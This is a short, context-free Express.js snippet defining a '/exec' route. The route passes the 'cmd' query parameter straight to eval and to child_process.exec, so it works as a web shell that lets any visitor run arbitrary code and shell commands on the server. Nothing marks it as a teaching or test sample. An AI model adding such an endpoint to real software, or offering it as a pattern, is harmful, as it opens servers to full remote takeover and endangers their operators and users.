app.get('/exec', (req, res) => {
    eval(req.query.cmd);
    require('child_process').exec(req.query.cmd);
  });
